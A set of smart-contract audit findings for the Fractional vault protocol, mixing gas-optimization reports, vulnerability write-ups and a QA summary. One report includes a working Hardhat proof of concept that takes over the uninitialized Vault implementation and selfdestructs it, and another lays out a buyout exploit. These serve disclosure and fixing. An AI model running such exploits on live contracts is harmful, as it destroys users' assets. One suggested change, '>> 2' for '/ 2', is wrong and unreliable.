┆ 252    ┆ 252 ┆ 1       │ ╰──────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ```  ### Lines - FERC1155.sol:128  - FERC1155.sol:173  - FERC1155.sol:233  - FERC1155.sol:277  - FERC1155.sol:297  - FERC1155.sol:303  - Migration.sol:228  - Migration.sol:267  - Migration.sol:304   ---  ## Mark functions as payable (with discretion) You can mark public or external functions as payable to save gas. Functions that are not payable have additional logic to check if there was a value sent with a call, however, making a function payable eliminates this check. This optimization should be carefully considered due to potentially unwanted behavior when a function does not need to accept ether.  ```js contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();     }      function testGas() public {         c0.isNotPayable();         c1.isPayable();     } }  contract Contract0 {     function isNotPayable() public view {         uint256 val = 0;         val++;     } }  contract Contract1 {     function isPayable() public payable {         uint256 val = 0;         val++;     } } ```  ### Gas Report ```js ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract0 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 32081              ┆ 190             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ isNotPayable       ┆ 198             ┆ 198 ┆ 198    ┆ 198 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract1 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 29681              ┆ 178             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ isPayable          ┆ 174             ┆ 174 ┆ 174    ┆ 174 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ```  ### Lines - targets:Supply.sol:23  - targets:Supply.sol:113  - FERC1155.sol:56  - FERC1155.sol:68  - FERC1155.sol:79  - FERC1155.sol:98  - FERC1155.sol:145  - FERC1155.sol:186  - FERC1155.sol:198  - FERC1155.sol:205  - FERC1155.sol:217  - FERC1155.sol:229  - FERC1155.sol:241  - FERC1155.sol:256  - FERC1155.sol:291  - FERC1155.sol:302  - FERC1155.sol:309  - FERC1155.sol:314  - SelfPermit.sol:18  - SelfPermit.sol:46  - Metadata.sol:24  - Metadata.sol:36  - SupplyReference.sol:22  - SupplyReference.sol:29  - Buyout.sol:112  - Buyout.sol:184  - Buyout.sol:244  - Buyout.sol:278  - Buyout.sol:311  - Buyout.sol:343  - Buyout.sol:376  - Buyout.sol:413  - Buyout.sol:450  - Buyout.sol:467  - VaultFactory.sol:26  - VaultFactory.sol:33  - VaultFactory.sol:55  - VaultFactory.sol:62  - Multicall.sol:11  - Vault.sol:24  - Vault.sol:73  - Vault.sol:86  - Vault.sol:93  - Vault.sol:101  - Minter.sol:24  - Minter.sol:32  - TransferReference.sol:17  - TransferReference.sol:30  - TransferReference.sol:45  - TransferReference.sol:61  - MerkleBase.sol:14  - MerkleBase.sol:43  - MerkleBase.sol:61  - MerkleBase.sol:73  - MerkleBase.sol:158  - Migration.sol:72  - Migration.sol:141  - Migration.sol:179  - Migration.sol:220  - Migration.sol:257  - Migration.sol:292  - Migration.sol:334  - Migration.sol:358  - Migration.sol:383  - Migration.sol:410  - Migration.sol:433  - Migration.sol:487  - VaultRegistry.sol:39  - VaultRegistry.sol:51  - VaultRegistry.sol:67  - VaultRegistry.sol:83  - VaultRegistry.sol:102  - VaultRegistry.sol:117  - VaultRegistry.sol:127  - VaultRegistry.sol:135  - VaultRegistry.sol:147  - BaseVault.sol:34  - BaseVault.sol:58  - BaseVault.sol:77  - BaseVault.sol:98  - BaseVault.sol:122  - targets:Transfer.sol:18  - targets:Transfer.sol:222  - targets:Transfer.sol:341  - targets:Transfer.sol:474   --- 
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L206   # Vulnerability details  ### Description  The `end` function in the `Buyout` contract uses `IERC1155(token).balanceOf(address(this), id)` to determine the amount of deposited fraction tokens without distinguishing whether those fraction tokens are depositied by the `sellFractions` function or by direct transferring. Note that only the `sellFractions` function is constrained by `PROPOSAL_PERIOD`.  This vulnerability lets a 51-holder gain the whole batch of NFTs without paying for the rest 49\% fractions.  Assume a vault X creates 100 fraction tokens and the market-decided price of a fraction token is 1 ether (i.e., the ideal value of the locked NFTs in vault X is 100 ether). Let's also assume that Alice holds 51 tokens (maybe by paying 51 ether on opensea).  Followings are two scenarios, where the benign one follows the normal workflow and the malicious one exploits the vulnerability.  ### Benign Scenario  + Alice starts a buyout by depositing her 51 fraction tokens and 49 ether, making the `fractionPrice` 1 ether + Other users are satisfied with the provided price, and hence no one buys or sells their fraction tokens + The buyout succeeds:     + Alice gets the locked NFTs     + Other fraction holders can invoke `cash` to redeem their fraction tokens with a price of 1 ether + As a result, Alice paid 100 ether in total to get the locked NFTs.   ### Malicious Scenario  + Alice starts a buyout by depositing 0 fraction tokens and 1 wei, making the `fractionPrice` 0.01 wei.     + Note that Alice can create a separated account whose balance for the fraction token is 0, to start the buyout + No one is satisfied with the price (0.01 wei v/s 1 ether) and hence they will try to buy fraction tokens to reject the buyout     + Since there is not any fraction tokens locked in the `Buyout` contract from Alice, other users do not need to do anything + Alice invokes the `end` function     + But before invoking the `end` function, __Alice directly invokes `IERC1155(token).safeTransferFrom` to send the rest 51 fraction token to the `Buyout` contract__     + The `end` function will treat the buyout successful, since the `IERC1155(token).balanceOf(address(this), id)` is bigger than 50\%     + The above two message calls happen in a single transaction, hence no one can front-run + As a result     + __Alice only paid 51 ether to get the locked NFTs whose value is 100 ether__     + __Other fraction holders get nothing (but they had paid for the fraction token before)__  In short, a malicious users can buy any NFT by just paying half of the NFT's market price  ### Suggested Fix  For each buyout, add a new field to record the amount of fraction tokens deposited by `sellFractions`. And in the `end` function, use the newly-added field to determine whether the buyout can be processed or not.  
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L105 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L141   # Vulnerability details  ## Impact Migration.join() and Migration.leave() can still work after unsucessful migration. As I submitted with my high-risk finding "Migration.withdrawContribution() might work unexpectedly after unsuccessful migration.", withdraw logic after unsuccessful migration is different from the initial leave() logic and the withdrawal logic would be messy if users call join() and leave() after unsuccessful migration.   ## Proof of Concept According to the [explanation](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L23), join() and leave() functions must be called for 7 days before commition.  Currently, such a scenario is possible.  - Alice creates a new migration and commits after some joins. - The migration ended unsuccessfully after 4 days. - Then users can call leave() or withdrawContribution() to withdraw their deposits but it wouldn't work properly because we should recalculate eth/fractional amounts with returned amounts after unsuccessful migration.   ## Tools Used Solidity Visual Developer of VSCode   ## Recommended Mitigation Steps We should add some restrictions to join() and leave() functions so that users can call these functions for 7 days before the migration is committed.  We should add these conditions to [join()](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L118) and [leave()](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L150).  ``` require(!migrationInfo[_vault][_proposalId].isCommited, "committed already"); require(block.timestamp <= proposal.startTime + PROPOSAL_PERIOD, "proposal over"); ```  
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L224-L238   # Vulnerability details  ## Impact In the end function of the Buyout contract, when the buyout fails, ERC1155 tokens are sent to the proposer. A malicious proposer can start a buyout using a contract that cannot receive ERC1155 tokens, and if the buyout fails, the end function fails because it cannot send ERC1155 tokens to the proposer. This prevents a new buyout from being started. ## Proof of Concept https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L224-L238 ## Tools Used None ## Recommended Mitigation Steps Consider saving the status of the proposer after a failed buyout and implementing functions to allow the proposer to withdraw the ERC1155 tokens and eth  
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultFactory.sol#L19-L22 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L11-L25   # Vulnerability details   This is a basic uninitialized proxy bug, the `VaultFactory` creates a single implementation of `Vault` and then creates a proxy to that implementation every time a new vault needs to be deployed.  The problem is that that implementation vault is not initialized , which means that anybody can initialize the contract to become the owner, and then destroy it by doing a delegate call (via the `execute` function) to a function with the `selfdestruct` opcode. Once the implementation is destroyed all of the vaults will be unusable. And since there's no logic in the proxies to update the implementation - that means this is permanent (i.e. there's no way to call any function on any vault anymore, they're simply dead).  ## Impact This is a critical bug, since ALL assets held by ALL vaults will be lost. There's no way to transfer them out and there's no way to run any function on any vault.  Also, there's no way to fix the current deployed contracts (modules and registry), since they all depend on the factory vault, and there's no way to update them to a different factory. That means Fractional would have to deploy a new set of contracts after fixing the bug (this is a relatively small issue though).  ## Proof of Concept  I created the PoC based on the `scripts/deploy.js` file, here's a stripped-down version of that:  ```javascript const { ethers } = require("hardhat");  const ZERO_ADDRESS = "0x0000000000000000000000000000000000000000";  async function main() {     const [deployer, attacker] = await ethers.getSigners();      // Get all contract factories     const BaseVault = await ethers.getContractFactory("BaseVault");     const Supply = await ethers.getContractFactory("Supply");     const VaultRegistry = await ethers.getContractFactory("VaultRegistry");      // Deploy contracts      const registry = await VaultRegistry.deploy();     await registry.deployed();      const supply = await Supply.deploy(registry.address);     await supply.deployed();      // notice that the `factory` var in the original `deploy.js` file is a different factory than the registry's     const registryVaultFactory = await ethers.getContractAt("VaultFactory", await registry.factory());      const implVaultAddress = await registryVaultFactory.implementation();     const vaultImpl = await ethers.getContractAt("Vault", implVaultAddress);      const baseVault = await BaseVault.deploy(registry.address, supply.address);     await baseVault.deployed();     // proxy vault - the vault that's used by the user     let proxyVault = await deployVault(baseVault, registry, attacker);      const destructorFactory = await ethers.getContractFactory("Destructor");     const destructor = await destructorFactory.deploy();       let destructData = destructor.interface.encodeFunctionData("destruct", [attacker.address]);      const abi = new ethers.utils.AbiCoder();     const leafData = abi.encode(["address", "address", "bytes4"],         [attacker.address, destructor.address, destructor.interface.getSighash("destruct")]);     const leafHash = ethers.utils.keccak256(leafData);      await vaultImpl.connect(attacker).init();      await vaultImpl.connect(attacker).setMerkleRoot(leafHash);     // we don't really need to do this ownership-transfer, because the contract is still usable till the end of the tx, but I'm doing it just in case     await vaultImpl.connect(attacker).transferOwnership(ZERO_ADDRESS);      // before: everything is fine     let implVaultCode = await ethers.provider.getCode(implVaultAddress);     console.log("Impl Vault code size before:", implVaultCode.length - 2); // -2 for the 0x prefix     let owner = await proxyVault.owner();     console.log("Proxy Vault works fine, owner is: ", owner);       await vaultImpl.connect(attacker).execute(destructor.address, destructData, []);       // after: vault implementation is destructed     implVaultCode = await ethers.provider.getCode(implVaultAddress);     console.log("\nVault code size after:", implVaultCode.length - 2); // -2 for the 0x prefix      try {         owner = await proxyVault.owner();     } catch (e) {         console.log("Proxy Vault isn't working anymore.", e.toString().substring(0, 300));     } }  async function deployVault(baseVault, registry, attacker) {     const nodes = await baseVault.getLeafNodes();      const tx = await registry.connect(attacker).create(nodes[0], [], []);     const receipt = await tx.wait();      const vaultEvent = receipt.events.find(e => e.address == registry.address);      const newVaultAddress = vaultEvent.args._vault;     const newVault = await ethers.getContractAt("Vault", newVaultAddress);     return newVault; }   if (require.main === module) {     main() } ```  `Destructor.sol` file:  ```solidity // SPDX-License-Identifier: MIT pragma solidity 0.8.13;  contract Destructor{     function destruct(address payable dst) public {         selfdestruct(dst);     } } ```  Output: ``` Impl Vault code size before: 10386 Proxy Vault works fine, owner is:  0x5FbDB2315678afecb367f032d93F642f64180aa3  Vault code size after: 0 Proxy Vault isn't working anymore. Error: call revert exception [ See: https://links.ethers.org/v5-errors-CALL_EXCEPTION ] (method="owner()", data="0x", errorArgs=null, errorName=null, errorSignature=null, reason=null, code=CALL_EXCEPTION, version=abi/5.6.2) ```  Sidenote: as the comment in the code says, we don't really need to transfer the ownership to the zero address. It's just that Foundry's `forge` did revert the destruction when I didn't do it, with the error of `OwnerChanged` (i.e. once the `selfdestruct` was called the owner became the zero address, which is different than the original owner) so I decided to add this just in case. This is probably a bug in `forge`, since the contract shouldn't destruct till the end of the tx (Hardhat indeed didn't revert the destruction even when the attacker was the owner).  ## Tools Used Hardhat  ## Recommended Mitigation Steps    Add init in `Vault`'s constructor (and make the `init` function `public` instead of `external`):  ```solidity contract Vault is IVault, NFTReceiver {     /// @notice Address of vault owner     address public owner;     /// ...      constructor(){         // initialize implementation         init();     }      /// @dev Initializes nonce and proxy owner     function init() public {  ```  Alternately you can add init in `VaultFactory.sol` constructor, but I think initializing in the contract itself is a better practice.  ```solidity     /// @notice Initializes implementation contract     constructor() {         implementation = address(new Vault());         Vault(implementation).init();     }  ```    After mitigation the PoC will output this:  ``` Error: VM Exception while processing transaction: reverted with custom error 'Initialized("0xa16E02E87b7454126E5E10d957A927A7F5B5d2be", "0x70997970C51812dc3A010C7d01b50e0d17dc79C8", 1)'     at Vault._execute (src/Vault.sol:124)     at Vault.init (src/Vault.sol:24)     at HardhatNode._mineBlockWithPendingTxs     .... ```  
## Summary The developers have opted for a highly optimized and flexible smart contract architecture with the use of quite novel code (createWithImmutableArgs) and extensive assembly. However, as the developers are most likely fully aware, comes at the cost of much lower readability and can make the architecture and interdependence between different contracts quite confusing. I believe a small flow diagram to showcase how an example architecture would be deployed would be a massive help in understanding the architecture. On the other hand, the developers went above and beyond in commenting the code which was vitally important especially for such a complex architecture. In the future, I would be very careful when developing and adding new modules as in this case the contract is only as strong as its weakest link. When adding a new module, I would not only make sure that the module itself is secure but if it interacts with other modules then it does not introduce new vulnerabilities as the interdependence between modules is not always straightforward.  ### Issue #1 Incorrect memory expansion gas cost calculation Code used to calculate memory expansion cost is inconsistent with equation 326 in the [ethereum yellow paper](https://ethereum.github.io/yellowpaper/paper.pdf)  This can cause incorrect errors to be reported  Currently the code is `cost += (returnDataWords-msizeWords) * COST_PER_WORD + (returnDataWords**2 - msizeWords**2) / MEMORY_EXPANSION_COEFFICIENT` when it should be `cost += (returnDataWords-msizeWords) * COST_PER_WORD + (returnDataWords - msizeWords)**2 / MEMORY_EXPANSION_COEFFICIENT`  Change ```solidity                         cost := add(                             cost,                             add(                                 mul(                                     sub(returnDataWords, msizeWords),                                     COST_PER_WORD                                 ),                                 div(                                     sub(                                         mul(returnDataWords, returnDataWords),                                         mul(msizeWords, msizeWords)                                     ),                                     MEMORY_EXPANSION_COEFFICIENT                                 )                             )                         ) ``` to ```solidity                         cost := add(                             cost,                             add(                                 mul(                                     sub(returnDataWords, msizeWords),                                     COST_PER_WORD                                 ),                                 div(                                     mul(                                         sub(returnDataWords, msizeWords),                                         sub(returnDataWords, msizeWords)                                     ),                                     MEMORY_EXPANSION_COEFFICIENT                                 )                             )                         ) ```  Occurences: https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Supply.sol#L66-L81 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Supply.sol#L156-L171 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L96-L117 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L281-L296 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L412-L427 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L642-L657 ### Issue #2 Storage check in `_execute()` from Vault.sol is obselete Currently `_execute()` contains the line: ```solidity         if (owner_ != owner) revert OwnerChanged(owner_, owner); ``` to make sure that the owner storage variable is not modified after the delegatecall. This check can be easily bypassed by modifying the other storage variables such as `nonce` (allows a user to reinitalise contract), `merkleRoot` (user can execute malicious permissions) or `methods` (a malicious plugin can be installed)  1. Either you can trust that the `_target` contracts will all be stateless and just remove the check to save gas OR 2. add extra checks to include the other storage variables (recommended)  Occurences: https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L132 ### Issue #3 Use of magic values Throughout the contracts, there is an inconsistent use of magic values where sometimes constants are used and sometimes magic values are used  e.g. Change ```solidity         uint256 buyoutPrice = (msg.value * 100) /             (100 - ((depositAmount * 100) / totalSupply));         uint256 fractionPrice = buyoutPrice / totalSupply; ``` to ```solidity uint256 public immutable PRECISION = 100; ...         uint256 buyoutPrice = (msg.value * PRECISION) /             (PRECISION - ((depositAmount * PRECISION) / totalSupply));         uint256 fractionPrice = buyoutPrice / totalSupply; ```  Occurences: https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L86-L88 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L208-L211 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L451 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L199 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Minter.sol#L37 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L315 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L452 ### Issue #4 No check that `newVault` is not zero address in `migrateFractions()` In `migrateFractions()` from Migration.sol, the `newVault` address is read with no check that the address is not the zero address (which can occur if someone calls `migrateFractions()` before `settleVault()` is called). This causes the transaction to revert with no proper error message when the function attempts to send tokens.   Consider adding a check to produce a custom error if `newVault == address(0)`  Occurences: https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L466
 ## Gas Optimizations   | Optimizations | Occurances | | :--- | :---: | | 1. Variables can be made immutable | 8 | | 2. Use `calldata` instead of memory | 15 | | 3. Use ++i instead of i++ & Add `unchecked { ++i; }` in loops | 2 | | 4. Remove unnecessary variables | 3 | | 5. Use storage pointer to set value | 1 | | 6. Internal functions which are used only once can be inlined | 2 | | 7. Mark function calls from known callers as payable to bypass the check | 6 | | 8. Use `>>1` instead of `/2` | 3 | | 9. Add `unchecked` block for where arithmetic overflow cannot happen | 5 | | 10. Using `a = a + b` instead of `a += b` for state variables saves gas | 2 | | 11. Looking up array length from memory every time in a loop costs more gas | 1 | | | |   ### 1. Following variables can be made immutable.     * `registry` in the [BaseVault.sol]( https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L19)   * `registry` in [Buyout.sol](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L29)   * `supply` in [Buyout.sol](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L31)   * `transfer` in [Buyout.sol](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L33)   * `supply` in [Minter.sol](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Minter.sol#L14)   * `buyout` in [Migration.sol](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L37)   * `registry` in [Migration.col](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L39)   * `implementation` in [VaultFactory.sol](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultFactory.sol#L15)   ### 2. Use `calldata` instead of memory in   * [FERC1155.sol#L68](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L68)   * [FERC1155.sol#L261](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L261)   * [FERC1155.sol#L83](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L83)   * [Vault.sol#L73](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L73)   * [Vault.sol#L101](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L101)   * [VaultRegistry.sol#L70](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L70)   * [VaultRegistry.sol#L71](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L71)   * [VaultRegistry.sol#L85](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L85)   * [VaultRegistry.sol#L86](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L86)   * [VaultRegistry.sol#L105](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L106)   * [VaultRegistry.sol#L150](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L150)   * [VaultRegistry.sol#L151](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L151)   * [VaultRegistry.sol#L168](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L168)   * [VaultRegistry.sol#L169](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L169)   * [Metadata.sol#L24](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/Metadata.sol#L24)  ### 3. Use `++i` instead of `i++` & Add `unchecked { ++i }` in all following for loops.   * [Vault.sol#L78](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L78)     ```diff     - for (uint256 i = 0; i < length; i++) {     -    methods[_selectors[i]] = _plugins[i];     - }     + for (uint256 i = 0; i < length; ) {     +    methods[_selectors[i]] = _plugins[i];     +    unchecked { ++i; }     + }               ```   * [Vault.sol#L104](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L104)     ```diff     - for (uint256 i = 0; i < length; i++) {     -     methods[_selectors[i]] = address(0);     - }     + for (uint256 i = 0; i < length; ) {     +     methods[_selectors[i]] = address(0);     +     unchecked { ++i; }     + }               ```  ### 4. Remove unnecessary variables:   * [VaultFactory.sol#L68](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultFactory.sol#L68) `data` is not necessary is variable      ```diff     - bytes memory data = abi.encodePacked();     - vault = implementation.clone(salt, data);     + vault = implementation.clone(salt, abi.encodePacked());         ```    * [Vault.sol#L60](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L60) `leaf` is not necessary and can be replaced by      ```diff     - bytes32 leaf = keccak256(abi.encode(msg.sender, _target, selector));     - if (!MerkleProof.verify(_proof, merkleRoot, leaf)) {         + if (!MerkleProof.verify(_proof, merkleRoot, keccak256(abi.encode(msg.sender, _target, selector)))) {     ```  * [VaultFactory#L46](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultFactory.sol#L46) 'data' is not necessary and can be replaced by      ```diff     - bytes32 data = keccak256(     -     abi.encodePacked(bytes1(0xff), address(this), salt, creationHash)     - );     - vault = address(uint160(uint256(data)));         + vault = address(uint160(uint256(keccak256(     +         abi.encodePacked(bytes1(0xff), address(this), salt, creationHash)     +     ))));     ```  ### 5. Use storage pointer to set value  * [Migration.sol#L279](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L279)      ```diff     -migrationInfo[_vault][_proposalId].fractionsMigrated = true;         +proposal.fractionsMigrated = true;             ```   <!-- ### 6. Internal functions which are used only once can be inlined   * https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L324   * https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L350 -->  ### 7. Mark function calls from known callers as payable to bypass the check * Functions with `onlyController` & `onlyRegistry` modifier in [FERC1155.sol](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol)       ```diff     - function setContractURI(string calldata _uri) external onlyController {     + function setContractURI(string calldata _uri) external payable onlyController {      - function setMetadata(address _metadata, uint256 _id) external onlyController {     + function setMetadata(address _metadata, uint256 _id) external payable onlyController {      - function setRoyalties( uint256 _id, address _receiver, uint256 _percentage ) external onlyController {      + function setRoyalties(uint256 _id, address _receiver, uint256 _percentage ) external payable onlyController {      - function transferController(address _newController) external onlyController {     + function transferController(address _newController) external payable onlyController {        - function burn(address _from, uint256 _id, uint256 _amount) external onlyRegistry {       + function burn(address _from, uint256 _id, uint256 _amount) external payable onlyRegistry {      - function mint(address _to, uint256 _id, uint256 _amount, bytes memory _data) external onlyRegistry {     + function mint(address _to, uint256 _id, uint256 _amount, bytes memory _data) external payable onlyRegistry {         ```       ### 8. Use `>> 1` instead of `/ 2` to save gas. Right shift x >> y is same as x / 2**y. * [MerkleBase.sol#L100](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L100)      ``` diff     - result = new bytes32[](length / 2 + 1);     + result = new bytes32[]((length >> 2) + 1);     .     .     - result = new bytes32[](length / 2);     + result = new bytes32[](length >> 2);     .     .     - _node = _node / 2;     + _node = _node >> 2;      ```  ### 9. Add `unchecked` block for where arithmetic overflow cannot happen * In `cash()` function in [Buyout.sol#L244](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L244):      ```diff     + unchecked {     +    uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);     +    uint256 buyoutShare = (tokenBalance * ethBalance) /     +        